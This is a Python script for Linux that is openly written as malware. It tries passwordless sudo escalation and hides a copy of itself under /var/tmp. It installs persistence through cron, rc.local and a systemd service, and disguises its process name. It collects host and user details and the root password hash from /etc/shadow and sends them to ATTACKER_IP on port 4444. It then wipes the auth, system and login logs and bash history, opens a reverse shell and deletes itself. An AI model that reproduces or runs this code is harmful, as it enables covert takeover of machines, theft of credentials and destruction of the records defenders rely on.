import os
import subprocess
import socket
import psutil 

# Configuration
ATTACKER_IP = "192.168.1.39"  
PORT = 4444 
HIDDEN_DIR = "/var/tmp/.webservice" 
HIDDEN_FILE = f"{HIDDEN_DIR}/webservice.py" 
PROCESS_NAME = "[webservice]" 
LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "/var/log/utmp", "/var/log/wtmp", os.path.expanduser("~/.bash_history")]  # Logs to clean
PERSIST_METHODS = [
    f"(crontab -l 2>/dev/null | grep -v {HIDDEN_FILE}; echo \"* * * * * python3 {HIDDEN_FILE} > /dev/null 2>&1\") | crontab -",
    f"echo 'python3 {HIDDEN_FILE}' >> /etc/rc.local",
    f"echo '@reboot python3 {HIDDEN_FILE}' | crontab -",
    f"mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=python3 {HIDDEN_FILE}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service"
]

if os.geteuid() != 0:
    try:
        subprocess.run(["sudo", "-n", "python3", __file__], check=True)
        exit(0)
    except subprocess.CalledProcessError:
        is_admin = "No"
else:
    is_admin = "Yes"

os.makedirs(HIDDEN_DIR, exist_ok=True)
with open(__file__, 'r') as f:
    code = f.read()
with open(HIDDEN_FILE, 'w') as f:
    f.write(code)
os.chmod(HIDDEN_DIR, 0o700)
os.chmod(HIDDEN_FILE, 0o700)
os.system(f"chattr +i {HIDDEN_DIR} {HIDDEN_FILE}")  # Make immutable
for method in PERSIST_METHODS:
    os.system(method)

p = psutil.Process(os.getpid())
p.name(PROCESS_NAME)

info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}"

if is_admin == "Yes":
    shadow = subprocess.getoutput('grep "^root:" /etc/shadow')
    info += f"\nRoot Shadow: {shadow}"
else:
    info += "\nNon-root: Shadow not readable. Other Users: " + subprocess.getoutput('grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd \',\' ')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, PORT))
s.send(f"sono connesso! Admin: {is_admin}\n".encode('utf-8'))
s.send(info.encode('utf-8'))
s.close()

for log in LOG_FILES:
    if os.path.exists(log):
        open(log, 'w').close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

os.remove(__file__)
